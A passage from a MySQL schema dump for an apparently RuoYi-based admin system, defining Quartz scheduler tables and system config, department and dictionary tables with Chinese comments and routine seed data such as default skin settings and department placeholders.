  `job_name` varchar(200) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '任务名称',
  `job_group` varchar(200) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '任务组名',
  `is_nonconcurrent` varchar(1) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '是否并发',
  `requests_recovery` varchar(1) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '是否接受恢复执行',
  PRIMARY KEY (`sched_name`,`entry_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='已触发的触发器表';

-- ----------------------------
-- Records of QRTZ_FIRED_TRIGGERS
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for QRTZ_JOB_DETAILS
-- ----------------------------
DROP TABLE IF EXISTS `QRTZ_JOB_DETAILS`;
CREATE TABLE `QRTZ_JOB_DETAILS` (
  `sched_name` varchar(120) COLLATE utf8mb4_general_ci NOT NULL COMMENT '调度名称',
  `job_name` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT '任务名称',
  `job_group` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT '任务组名',
  `description` varchar(250) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '相关介绍',
  `job_class_name` varchar(250) COLLATE utf8mb4_general_ci NOT NULL COMMENT '执行任务类名称',
  `is_durable` varchar(1) COLLATE utf8mb4_general_ci NOT NULL COMMENT '是否持久化',
  `is_nonconcurrent` varchar(1) COLLATE utf8mb4_general_ci NOT NULL COMMENT '是否并发',
  `is_update_data` varchar(1) COLLATE utf8mb4_general_ci NOT NULL COMMENT '是否更新数据',
  `requests_recovery` varchar(1) COLLATE utf8mb4_general_ci NOT NULL COMMENT '是否接受恢复执行',
  `job_data` blob COMMENT '存放持久化job对象',
  PRIMARY KEY (`sched_name`,`job_name`,`job_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='任务详细信息表';

-- ----------------------------
-- Records of QRTZ_JOB_DETAILS
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for QRTZ_LOCKS
-- ----------------------------
DROP TABLE IF EXISTS `QRTZ_LOCKS`;
CREATE TABLE `QRTZ_LOCKS` (
  `sched_name` varchar(120) COLLATE utf8mb4_general_ci NOT NULL COMMENT '调度名称',
  `lock_name` varchar(40) COLLATE utf8mb4_general_ci NOT NULL COMMENT '悲观锁名称',
  PRIMARY KEY (`sched_name`,`lock_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='存储的悲观锁信息表';

-- ----------------------------
-- Records of QRTZ_LOCKS
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for QRTZ_PAUSED_TRIGGER_GRPS
-- ----------------------------
DROP TABLE IF EXISTS `QRTZ_PAUSED_TRIGGER_GRPS`;
CREATE TABLE `QRTZ_PAUSED_TRIGGER_GRPS` (
  `sched_name` varchar(120) COLLATE utf8mb4_general_ci NOT NULL COMMENT '调度名称',
  `trigger_group` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT 'qrtz_triggers表trigger_group的外键',
  PRIMARY KEY (`sched_name`,`trigger_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='暂停的触发器表';

-- ----------------------------
-- Records of QRTZ_PAUSED_TRIGGER_GRPS
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for QRTZ_SCHEDULER_STATE
-- ----------------------------
DROP TABLE IF EXISTS `QRTZ_SCHEDULER_STATE`;
CREATE TABLE `QRTZ_SCHEDULER_STATE` (
  `sched_name` varchar(120) COLLATE utf8mb4_general_ci NOT NULL COMMENT '调度名称',
  `instance_name` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT '实例名称',
  `last_checkin_time` bigint NOT NULL COMMENT '上次检查时间',
  `checkin_interval` bigint NOT NULL COMMENT '检查间隔时间',
  PRIMARY KEY (`sched_name`,`instance_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='调度器状态表';

-- ----------------------------
-- Records of QRTZ_SCHEDULER_STATE
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for QRTZ_SIMPLE_TRIGGERS
-- ----------------------------
DROP TABLE IF EXISTS `QRTZ_SIMPLE_TRIGGERS`;
CREATE TABLE `QRTZ_SIMPLE_TRIGGERS` (
  `sched_name` varchar(120) COLLATE utf8mb4_general_ci NOT NULL COMMENT '调度名称',
  `trigger_name` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT 'qrtz_triggers表trigger_name的外键',
  `trigger_group` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT 'qrtz_triggers表trigger_group的外键',
  `repeat_count` bigint NOT NULL COMMENT '重复的次数统计',
  `repeat_interval` bigint NOT NULL COMMENT '重复的间隔时间',
  `times_triggered` bigint NOT NULL COMMENT '已经触发的次数',
  PRIMARY KEY (`sched_name`,`trigger_name`,`trigger_group`),
  CONSTRAINT `qrtz_simple_triggers_ibfk_1` FOREIGN KEY (`sched_name`, `trigger_name`, `trigger_group`) REFERENCES `QRTZ_TRIGGERS` (`sched_name`, `trigger_name`, `trigger_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='简单触发器的信息表';

-- ----------------------------
-- Records of QRTZ_SIMPLE_TRIGGERS
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for QRTZ_SIMPROP_TRIGGERS
-- ----------------------------
DROP TABLE IF EXISTS `QRTZ_SIMPROP_TRIGGERS`;
CREATE TABLE `QRTZ_SIMPROP_TRIGGERS` (
  `sched_name` varchar(120) COLLATE utf8mb4_general_ci NOT NULL COMMENT '调度名称',
  `trigger_name` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT 'qrtz_triggers表trigger_name的外键',
  `trigger_group` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT 'qrtz_triggers表trigger_group的外键',
  `str_prop_1` varchar(512) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT 'String类型的trigger的第一个参数',
  `str_prop_2` varchar(512) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT 'String类型的trigger的第二个参数',
  `str_prop_3` varchar(512) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT 'String类型的trigger的第三个参数',
  `int_prop_1` int DEFAULT NULL COMMENT 'int类型的trigger的第一个参数',
  `int_prop_2` int DEFAULT NULL COMMENT 'int类型的trigger的第二个参数',
  `long_prop_1` bigint DEFAULT NULL COMMENT 'long类型的trigger的第一个参数',
  `long_prop_2` bigint DEFAULT NULL COMMENT 'long类型的trigger的第二个参数',
  `dec_prop_1` decimal(13,4) DEFAULT NULL COMMENT 'decimal类型的trigger的第一个参数',
  `dec_prop_2` decimal(13,4) DEFAULT NULL COMMENT 'decimal类型的trigger的第二个参数',
  `bool_prop_1` varchar(1) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT 'Boolean类型的trigger的第一个参数',
  `bool_prop_2` varchar(1) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT 'Boolean类型的trigger的第二个参数',
  PRIMARY KEY (`sched_name`,`trigger_name`,`trigger_group`),
  CONSTRAINT `qrtz_simprop_triggers_ibfk_1` FOREIGN KEY (`sched_name`, `trigger_name`, `trigger_group`) REFERENCES `QRTZ_TRIGGERS` (`sched_name`, `trigger_name`, `trigger_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='同步机制的行锁表';

-- ----------------------------
-- Records of QRTZ_SIMPROP_TRIGGERS
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for QRTZ_TRIGGERS
-- ----------------------------
DROP TABLE IF EXISTS `QRTZ_TRIGGERS`;
CREATE TABLE `QRTZ_TRIGGERS` (
  `sched_name` varchar(120) COLLATE utf8mb4_general_ci NOT NULL COMMENT '调度名称',
  `trigger_name` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT '触发器的名字',
  `trigger_group` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT '触发器所属组的名字',
  `job_name` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT 'qrtz_job_details表job_name的外键',
  `job_group` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT 'qrtz_job_details表job_group的外键',
  `description` varchar(250) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '相关介绍',
  `next_fire_time` bigint DEFAULT NULL COMMENT '上一次触发时间（毫秒）',
  `prev_fire_time` bigint DEFAULT NULL COMMENT '下一次触发时间（默认为-1表示不触发）',
  `priority` int DEFAULT NULL COMMENT '优先级',
  `trigger_state` varchar(16) COLLATE utf8mb4_general_ci NOT NULL COMMENT '触发器状态',
  `trigger_type` varchar(8) COLLATE utf8mb4_general_ci NOT NULL COMMENT '触发器的类型',
  `start_time` bigint NOT NULL COMMENT '开始时间',
  `end_time` bigint DEFAULT NULL COMMENT '结束时间',
  `calendar_name` varchar(200) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '日程表名称',
  `misfire_instr` smallint DEFAULT NULL COMMENT '补偿执行的策略',
  `job_data` blob COMMENT '存放持久化job对象',
  PRIMARY KEY (`sched_name`,`trigger_name`,`trigger_group`),
  KEY `sched_name` (`sched_name`,`job_name`,`job_group`),
  CONSTRAINT `qrtz_triggers_ibfk_1` FOREIGN KEY (`sched_name`, `job_name`, `job_group`) REFERENCES `QRTZ_JOB_DETAILS` (`sched_name`, `job_name`, `job_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='触发器详细信息表';

-- ----------------------------
-- Records of QRTZ_TRIGGERS
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for sys_config
-- ----------------------------
DROP TABLE IF EXISTS `sys_config`;
CREATE TABLE `sys_config` (
  `config_id` int NOT NULL AUTO_INCREMENT COMMENT '参数主键',
  `config_name` varchar(100) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '参数名称',
  `config_key` varchar(100) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '参数键名',
  `config_value` varchar(500) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '参数键值',
  `config_type` char(1) COLLATE utf8mb4_general_ci DEFAULT 'N' COMMENT '系统内置（Y是 N否）',
  `create_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`config_id`)
) ENGINE=InnoDB AUTO_INCREMENT=100 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='参数配置表';

-- ----------------------------
-- Records of sys_config
-- ----------------------------
BEGIN;
INSERT INTO `sys_config` (`config_id`, `config_name`, `config_key`, `config_value`, `config_type`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1, '主框架页-默认皮肤样式名称', 'sys.index.skinName', 'skin-blue', 'Y', 'admin', '2023-10-23 20:57:31', '', NULL, '蓝色 skin-blue、绿色 skin-green、紫色 skin-purple、红色 skin-red、黄色 skin-yellow');
INSERT INTO `sys_config` (`config_id`, `config_name`, `config_key`, `config_value`, `config_type`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2, '用户管理-账号初始密码', 'sys.user.initPassword', '123456', 'Y', 'admin', '2023-10-23 20:57:31', '', NULL, '初始化密码 123456');
INSERT INTO `sys_config` (`config_id`, `config_name`, `config_key`, `config_value`, `config_type`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (3, '主框架页-侧边栏主题', 'sys.index.sideTheme', 'theme-dark', 'Y', 'admin', '2023-10-23 20:57:31', '', NULL, '深色主题theme-dark，浅色主题theme-light');
INSERT INTO `sys_config` (`config_id`, `config_name`, `config_key`, `config_value`, `config_type`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (4, '账号自助-验证码开关', 'sys.account.captchaEnabled', 'true', 'Y', 'admin', '2023-10-23 20:57:31', '', NULL, '是否开启验证码功能（true开启，false关闭）');
INSERT INTO `sys_config` (`config_id`, `config_name`, `config_key`, `config_value`, `config_type`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (5, '账号自助-是否开启用户注册功能', 'sys.account.registerUser', 'false', 'Y', 'admin', '2023-10-23 20:57:31', '', NULL, '是否开启注册用户功能（true开启，false关闭）');
INSERT INTO `sys_config` (`config_id`, `config_name`, `config_key`, `config_value`, `config_type`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (6, '用户登录-黑名单列表', 'sys.login.blackIPList', '', 'Y', 'admin', '2023-10-23 20:57:31', '', NULL, '设置登录IP黑名单限制，多个匹配项以;分隔，支持匹配（*通配、网段）');
COMMIT;

-- ----------------------------
-- Table structure for sys_dept
-- ----------------------------
DROP TABLE IF EXISTS `sys_dept`;
CREATE TABLE `sys_dept` (
  `dept_id` bigint NOT NULL AUTO_INCREMENT COMMENT '部门id',
  `parent_id` bigint DEFAULT '0' COMMENT '父部门id',
  `ancestors` varchar(50) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '祖级列表',
  `dept_name` varchar(30) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '部门名称',
  `order_num` int DEFAULT '0' COMMENT '显示顺序',
  `leader` varchar(20) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '负责人',
  `phone` varchar(11) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '联系电话',
  `email` varchar(50) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '邮箱',
  `status` char(1) COLLATE utf8mb4_general_ci DEFAULT '0' COMMENT '部门状态（0正常 1停用）',
  `del_flag` char(1) COLLATE utf8mb4_general_ci DEFAULT '0' COMMENT '删除标志（0代表存在 2代表删除）',
  `create_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  PRIMARY KEY (`dept_id`)
) ENGINE=InnoDB AUTO_INCREMENT=201 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='部门表';

-- ----------------------------
-- Records of sys_dept
-- ----------------------------
BEGIN;
INSERT INTO `sys_dept` (`dept_id`, `parent_id`, `ancestors`, `dept_name`, `order_num`, `leader`, `phone`, `email`, `status`, `del_flag`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (100, 0, '0', '童辰科技', 0, '童辰', '15888888888', 'tckj@qq.com', '0', '0', 'admin', '2023-10-23 20:57:31', 'admin', '2023-10-24 09:59:44');
INSERT INTO `sys_dept` (`dept_id`, `parent_id`, `ancestors`, `dept_name`, `order_num`, `leader`, `phone`, `email`, `status`, `del_flag`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (101, 100, '0,100', '管理部门', 1, '若依', '15888888888', 'ry@qq.com', '0', '0', 'admin', '2023-10-23 20:57:31', 'admin', '2023-10-24 10:03:26');
INSERT INTO `sys_dept` (`dept_id`, `parent_id`, `ancestors`, `dept_name`, `order_num`, `leader`, `phone`, `email`, `status`, `del_flag`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (102, 100, '0,100', '长沙分公司', 2, '若依', '15888888888', 'ry@qq.com', '0', '2', 'admin', '2023-10-23 20:57:31', '', NULL);
INSERT INTO `sys_dept` (`dept_id`, `parent_id`, `ancestors`, `dept_name`, `order_num`, `leader`, `phone`, `email`, `status`, `del_flag`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (103, 101, '0,100,101', '研发部门', 1, '若依', '15888888888', 'ry@qq.com', '0', '2', 'admin', '2023-10-23 20:57:31', '', NULL);
INSERT INTO `sys_dept` (`dept_id`, `parent_id`, `ancestors`, `dept_name`, `order_num`, `leader`, `phone`, `email`, `status`, `del_flag`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (104, 101, '0,100,101', '市场部门', 2, '若依', '15888888888', 'ry@qq.com', '0', '2', 'admin', '2023-10-23 20:57:31', '', NULL);
INSERT INTO `sys_dept` (`dept_id`, `parent_id`, `ancestors`, `dept_name`, `order_num`, `leader`, `phone`, `email`, `status`, `del_flag`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (105, 101, '0,100,101', '测试部门', 3, '若依', '15888888888', 'ry@qq.com', '0', '2', 'admin', '2023-10-23 20:57:31', '', NULL);
INSERT INTO `sys_dept` (`dept_id`, `parent_id`, `ancestors`, `dept_name`, `order_num`, `leader`, `phone`, `email`, `status`, `del_flag`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (106, 101, '0,100,101', '财务部门', 4, '若依', '15888888888', 'ry@qq.com', '0', '2', 'admin', '2023-10-23 20:57:31', '', NULL);
INSERT INTO `sys_dept` (`dept_id`, `parent_id`, `ancestors`, `dept_name`, `order_num`, `leader`, `phone`, `email`, `status`, `del_flag`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (107, 101, '0,100,101', '运维部门', 5, '若依', '15888888888', 'ry@qq.com', '0', '2', 'admin', '2023-10-23 20:57:31', '', NULL);
INSERT INTO `sys_dept` (`dept_id`, `parent_id`, `ancestors`, `dept_name`, `order_num`, `leader`, `phone`, `email`, `status`, `del_flag`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (108, 102, '0,100,102', '市场部门', 1, '若依', '15888888888', 'ry@qq.com', '0', '2', 'admin', '2023-10-23 20:57:31', '', NULL);
INSERT INTO `sys_dept` (`dept_id`, `parent_id`, `ancestors`, `dept_name`, `order_num`, `leader`, `phone`, `email`, `status`, `del_flag`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (109, 102, '0,100,102', '财务部门', 2, '若依', '15888888888', 'ry@qq.com', '0', '2', 'admin', '2023-10-23 20:57:31', '', NULL);
INSERT INTO `sys_dept` (`dept_id`, `parent_id`, `ancestors`, `dept_name`, `order_num`, `leader`, `phone`, `email`, `status`, `del_flag`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (200, 100, '0,100', '学生用户', 2, '高飞', '15888888888', NULL, '0', '0', 'admin', '2023-10-24 10:04:15', 'admin', '2023-10-31 15:39:29');
COMMIT;

-- ----------------------------
-- Table structure for sys_dict_data
-- ----------------------------
DROP TABLE IF EXISTS `sys_dict_data`;
CREATE TABLE `sys_dict_data` (
  `dict_code` bigint NOT NULL AUTO_INCREMENT COMMENT '字典编码',
  `dict_sort` int DEFAULT '0' COMMENT '字典排序',
  `dict_label` varchar(100) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '字典标签',
  `dict_value` varchar(100) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '字典键值',
  `dict_type` varchar(100) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '字典类型',
  `css_class` varchar(100) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '样式属性（其他样式扩展）',
  `list_class` varchar(100) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '表格回显样式',
  `is_default` char(1) COLLATE utf8mb4_general_ci DEFAULT 'N' COMMENT '是否默认（Y是 N否）',
  `status` char(1) COLLATE utf8mb4_general_ci DEFAULT '0' COMMENT '状态（0正常 1停用）',
  `create_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`dict_code`)
) ENGINE=InnoDB AUTO_INCREMENT=109 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='字典数据表';

-- ----------------------------
-- Records of sys_dict_data
-- ----------------------------
BEGIN;
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1, 1, '男', '0', 'sys_user_sex', '', '', 'Y', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '性别男');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2, 2, '女', '1', 'sys_user_sex', '', '', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '性别女');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (3, 3, '未知', '2', 'sys_user_sex', '', '', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '性别未知');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (4, 1, '显示', '0', 'sys_show_hide', '', 'primary', 'Y', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '显示菜单');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (5, 2, '隐藏', '1', 'sys_show_hide', '', 'danger', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '隐藏菜单');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (6, 1, '正常', '0', 'sys_normal_disable', '', 'primary', 'Y', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '正常状态');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (7, 2, '停用', '1', 'sys_normal_disable', '', 'danger', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '停用状态');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (8, 1, '正常', '0', 'sys_job_status', '', 'primary', 'Y', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '正常状态');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (9, 2, '暂停', '1', 'sys_job_status', '', 'danger', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '停用状态');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (10, 1, '默认', 'DEFAULT', 'sys_job_group', '', '', 'Y', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '默认分组');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (11, 2, '系统', 'SYSTEM', 'sys_job_group', '', '', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '系统分组');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (12, 1, '是', 'Y', 'sys_yes_no', '', 'primary', 'Y', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '系统默认是');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (13, 2, '否', 'N', 'sys_yes_no', '', 'danger', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '系统默认否');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (14, 1, '通知', '1', 'sys_notice_type', '', 'warning', 'Y', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '通知');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (15, 2, '公告', '2', 'sys_notice_type', '', 'success', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '公告');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (16, 1, '正常', '0', 'sys_notice_status', '', 'primary', 'Y', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '正常状态');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (17, 2, '关闭', '1', 'sys_notice_status', '', 'danger', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '关闭状态');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (18, 99, '其他', '0', 'sys_oper_type', '', 'info', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '其他操作');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (19, 1, '新增', '1', 'sys_oper_type', '', 'info', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '新增操作');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (20, 2, '修改', '2', 'sys_oper_type', '', 'info', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '修改操作');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (21, 3, '删除', '3', 'sys_oper_type', '', 'danger', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '删除操作');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (22, 4, '授权', '4', 'sys_oper_type', '', 'primary', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '授权操作');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (23, 5, '导出', '5', 'sys_oper_type', '', 'warning', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '导出操作');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (24, 6, '导入', '6', 'sys_oper_type', '', 'warning', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '导入操作');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (25, 7, '强退', '7', 'sys_oper_type', '', 'danger', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '强退操作');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (26, 8, '生成代码', '8', 'sys_oper_type', '', 'warning', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '生成操作');
